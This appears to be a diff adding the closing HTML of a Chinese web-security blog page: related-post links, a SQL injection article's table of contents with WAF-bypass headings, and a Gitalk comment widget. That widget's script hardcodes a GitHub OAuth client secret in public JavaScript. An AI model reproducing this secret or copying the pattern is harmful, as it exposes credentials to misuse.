+                        data-hash="md5-nYLJOneBUTabmyePOVRC8w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:sqlmap常用参数整理</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.7a00d4ec355b0228bf22cadbfd4376f9_hub6d28757c33c1ef5c0f635b7b627146b_864309_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:文件包含漏洞"
+                        
+                        data-hash="md5-egDU7DVbAii/Isrb/UN2&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:文件包含漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/cover.6c0349c21e246ba5c06b72ea79814838_hu7c854b3953090c9fdfa2da02ac591aa6_4062930_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:命令执行/注入(RCE)"
+                        
+                        data-hash="md5-bANJwh4ka6XAa3LqeYFIOA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:命令执行/注入(RCE)</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%82%A3%E4%BA%9B%E4%BA%8B/cover.2d08c3607afcf5fd71db66ccf33340ce_hub66e432b1b6d7210dd7ccd81a1693998_438324_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:关于信息收集那些事"
+                        
+                        data-hash="md5-LQjDYHr89f1x22bM8zNAzg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:关于信息收集那些事</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E4%BC%AA%E9%80%A0/cover.f63b69aa4f4219156654b595210bbc9d_hu337d2e493e824d835754f79e3b77496e_3809477_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全--浏览器信息伪造"
+                        
+                        data-hash="md5-9jtpqk9CGRVmVLWVIQu8nQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全--浏览器信息伪造</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div id="gitalk-container"></div>
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: "350f7151191770b41225",
+        clientSecret: "dfc2d6ff148e57ac47c9efedb4ddf9c370fc33f0",
+        repo: "kira-pgr.github.io",
+        owner: "Kira-Pgr",
+        admin: ["Kira-Pgr"],
+        distractionFreeMode: false, 
+        id: md5(location.pathname), 
+    });
+    (function () {
+        if (
+            ["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1
+        ) {
+            document.getElementById("gitalk-container").innerHTML =
+                "Gitalk comments not available by default when the website is previewed locally.";
+            return;
+        }
+        gitalk.render("gitalk-container");
+    })();
+</script>
+
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2023 猫猫の博客
+    </section>
+    
+    <section class="powerby">
+        
+            For a better open source community! <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.13.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#概念">概念</a></li>
+    <li><a href="#分类">分类</a>
+      <ol>
+        <li><a href="#显注">显注</a></li>
+        <li><a href="#盲注">盲注</a></li>
+      </ol>
+    </li>
+    <li><a href="#靶场实战">靶场实战</a>
+      <ol>
+        <li><a href="#显注-1">显注</a>
+          <ol>
+            <li><a href="#检测注入点">检测注入点</a></li>
+            <li><a href="#查询数据库中信息">查询数据库中信息</a>
+              <ol>
+                <li><a href="#闭合篇">闭合篇</a></li>
+                <li><a href="#union篇">UNION篇</a></li>
+                <li><a href="#你好数据篇">你好，数据篇</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+        <li><a href="#布尔型盲注">布尔型盲注</a>
+          <ol>
+            <li><a href="#尝试显注中的方法">尝试显注中的方法</a></li>
+            <li><a href="#思考新方法">思考新方法</a></li>
+            <li><a href="#检测注入点-1">检测注入点</a></li>
+            <li><a href="#获取数据">获取数据</a>
+              <ol>
+                <li><a href="#二分法偷懒">二分法偷懒</a></li>
+                <li><a href="#层层推进">层层推进</a></li>
+              </ol>
+            </li>
+            <li><a href="#通过burp自动化">通过Burp自动化</a></li>
+          </ol>
+        </li>
+        <li><a href="#时间型盲注">时间型盲注</a>
+          <ol>
+            <li><a href="#继续思考">继续思考</a></li>
+            <li><a href="#注入案例演示">注入案例演示</a></li>
+          </ol>
+        </li>
+        <li><a href="#交srcの小技巧">交SRCの小技巧</a></li>
+      </ol>
+    </li>
+    <li><a href="#实验中发现の小注意点">实验中发现の小注意点</a>
+      <ol>
+        <li><a href="#强烈建议不要用win搭建渗透测试环境">强烈建议不要用Win搭建渗透测试环境</a></li>
+        <li><a href="#illegal-mix-of-collations-for-operation-union">Illegal mix of collations for operation &lsquo;UNION&rsquo;</a></li>
+      </ol>
+    </li>
+    <li><a href="#waf绕过">WAF绕过</a>
+      <ol>
+        <li><a href="#检测union-select">检测UNION SELECT</a>
+          <ol>
+            <li><a href="#get--post">GET&ndash;&gt;POST</a></li>
+          </ol>
+        </li>
+        <li><a href="#检测databaseuser等函数">检测database(),user()等函数</a>
+          <ol>
+            <li><a href="#concat拼接逝世了">concat拼接(逝世了)</a></li>
+            <li><a href="#利用函数名feature进行拼接">利用函数名&quot;feature&quot;进行拼接</a></li>
+          </ol>
+        </li>
+        <li><a href="#绕过select-a-from-b格式检测">绕过SELECT A FROM B格式检测</a>
+          <ol>
+            <li><a href="#round-1-替换空格">Round 1: 替换空格</a></li>
+            <li><a href="#round-2-select和from用注释劈开">Round 2: SELECT和FROM用注释劈开</a></li>
+            <li><a href="#round-3-使用内联注释url编码的盲注payload">Round 3: 使用内联注释+URL编码的盲注payload</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#ref">ref</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script src="/js/snow.js"></script>
+<script
+    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
+    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
+    crossorigin="anonymous"
+    size="300"
+    alpha="0.6"
+    zindex="-1"
+    defer
+></script>
+
+    </body>
+</html>
